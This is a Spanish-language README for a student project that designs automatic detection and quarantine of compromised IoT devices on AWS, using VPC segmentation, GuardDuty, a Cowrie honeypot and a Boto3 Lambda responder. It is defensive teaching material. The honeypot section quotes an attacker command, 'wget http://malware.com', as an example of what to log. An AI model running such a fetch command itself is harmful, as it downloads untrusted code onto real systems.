# TFG_SentinelSDN
SentinelSDN: Sistema de Micro-segmentación Dinámica y Cuarentena Automática mediante Redes Definidas por Software (SDN)


El Problema: El "Ladrón Silencioso" en la Casa Inteligente
Imagina que hoy en día todo está conectado: las cámaras de seguridad, las bombillas y hasta la nevera. El problema es que estos aparatos suelen tener "cerraduras" muy flojas.

Si un ladrón consigue entrar por la bombilla inteligente del jardín, una vez dentro de la casa puede moverse libremente por los pasillos hasta llegar a tu caja fuerte (tus datos bancarios o fotos privadas). 
Normalmente, esto solo se detecta si alguien mira las cámaras por casualidad, y para cuando quieres reaccionar, el ladrón ya se ha escapado con el botín.

Nuestra Solución: La Casa que se Defiende Sola
Hemos creado un sistema de seguridad inteligente para la "nube" que no necesita que un humano esté mirando la pantalla. Funciona así:

- Vigilancia 24/7: Tenemos sensores que analizan cómo se comportan los aparatos. Si una bombilla de repente intenta "abrir la caja fuerte", el sistema sabe que algo va mal.

- Reacción Instantánea: En el mismo segundo en que detecta al intruso, nuestra programación (el "cerebro") da una orden a las paredes de la casa.

- La Trampa: Las paredes se mueven solas, cierran los pasillos y redirigen al ladrón a una "habitación falsa" que parece real pero no tiene nada de valor. El ladrón cree que está robando, pero en realidad está en una celda digital aislada de la casa real.

En resumen: Hemos pasado de una seguridad que solo avisa cuando ya te han robado, a una infraestructura inteligente que detecta al atacante y lo encierra automáticamente antes de que pueda hacer daño.

DIRECTRICES: 

🛠️ 1. Redes: Ingeniería de Infraestructura Programable (VPC & Routing)
El diseño de la red no es solo "crear subredes", es definir el plano de datos sobre el cual actuará vuestra lógica.

A. Segmentación de Red (Layer 3)
VPC (Virtual Private Cloud): Debes diseñar un direccionamiento IP que permita escalabilidad. Un bloque CIDR estándar como 10.0.0.0/16 es ideal.

Diseño de Subredes:

Public Subnet (/24): Contendrá el NAT Gateway (para que las máquinas privadas descarguen actualizaciones) y el Bastion Host (para administración).

IoT Subnet (/24 - Aislada): Aquí residirán las instancias EC2 que simulan los sensores. Su tabla de rutas no debe tener salida directa a internet, sino a través de un Firewall o el NAT.

Forensics/Quarantine Subnet (/24): Una zona de "arena" (sandbox) donde el tráfico está restringido y monitorizado al 100%.

Enrutamiento Dinámico: Debes investigar cómo las Route Tables pueden ser manipuladas por la API. El concepto clave es el "Blackholing" (enviar tráfico a una interfaz inexistente) o la redirección hacia un VPC Endpoint.

B. Seguridad Perimetral y de Host
Security Groups (SG): Actúan como firewalls stateful. Debes definir una nomenclatura clara (ej. SG-IoT-Production vs SG-IoT-Quarantine).

VPC Flow Logs: Es el "WireShark" de la nube. Debes configurar la captura de metadatos de red (IP origen/destino, puerto, protocolo, bytes, acción ACCEPT/REJECT) y entender cómo se estructuran en formato JSON o Parquet para que Ciber y Python puedan procesarlos.


🛡️ 2. Ciberseguridad: Inteligencia de Amenazas y Deception
Tu misión es construir un sistema de detección temprana basado en el comportamiento (no solo firmas) y una infraestructura de engaño.

A. Detección con AWS GuardDuty
Fuentes de Datos: GuardDuty no analiza el tráfico paquete a paquete (sería muy caro), sino que analiza los VPC Flow Logs, CloudTrail y DNS Query Logs.

Tipos de Hallazgos (Findings): Debes profundizar en la taxonomía de amenazas de AWS:

Backdoor:EC2/C&CActivity.B!DNS: El dispositivo IoT intenta contactar con un servidor de Control y Comando.

Recon:EC2/PortScanning: Escaneo de puertos interno.

Severidad: Entender la escala de 0.1 a 8.9 para decidir cuándo debe actuar Python automáticamente (ej. solo en severidades > 7.0).

B. Infraestructura de Engaño (Honeypots)
Deception Technology: No solo pondrás una máquina vulnerable. Debes investigar Cowrie para emular SSH y Telnet.

Logs Forenses: Debes configurar la exportación de logs de Cowrie hacia CloudWatch Logs. Si el atacante ejecuta wget http://malware.com, esa URL debe ser capturada para análisis posterior.

C. Orquestación de Eventos
Amazon EventBridge: Debes dominar los Event Patterns. No quieres que Python se active con cualquier cosa, solo con eventos específicos de GuardDuty que afecten a la subred de IoT.


🐍 3. Python: Automatización de Respuesta ante Incidentes (SOAR)
Tú desarrollas lo que en la industria se llama SOAR (Security Orchestration, Automation, and Response).

A. SDK Boto3 y Programación Asíncrona
Cliente vs Recurso: Debes entender cuándo usar boto3.client (para llamadas de bajo nivel a la API) y boto3.resource (orientado a objetos).

AWS Lambda: El código debe ser eficiente. Investigar el manejo de la memoria y los timeouts de Lambda.

Idempotencia: Tu script debe ser capaz de ejecutarse varias veces sin causar errores (ej. si intentas mover a cuarentena a un host que ya está allí, el script no debe fallar).

B. Lógica de Aislamiento y Remediación
Parsing de JSON: Recibirás un evento de EventBridge. Debes "parsear" el objeto para obtener el instance-id de la víctima.

Modificación de Atributos: Usarás modify_instance_attribute para cambiar el Security Group.

Snapshotting Automático: Un toque de rigor extra: antes de aislar la máquina, tu script de Python debería lanzar un EBS Snapshot (copia de seguridad del disco) para que el compañero de Ciber pueda hacer análisis forense después sin miedo a que el atacante borre huellas.

C. Seguridad del Código (IAM Role)
IAM Policies: No uses AdministratorAccess. Debes escribir una política JSON que solo permita:

ec2:DescribeInstances

ec2:ModifyInstanceAttribute

ec2:CreateSnapshot

logs:CreateLogGroup
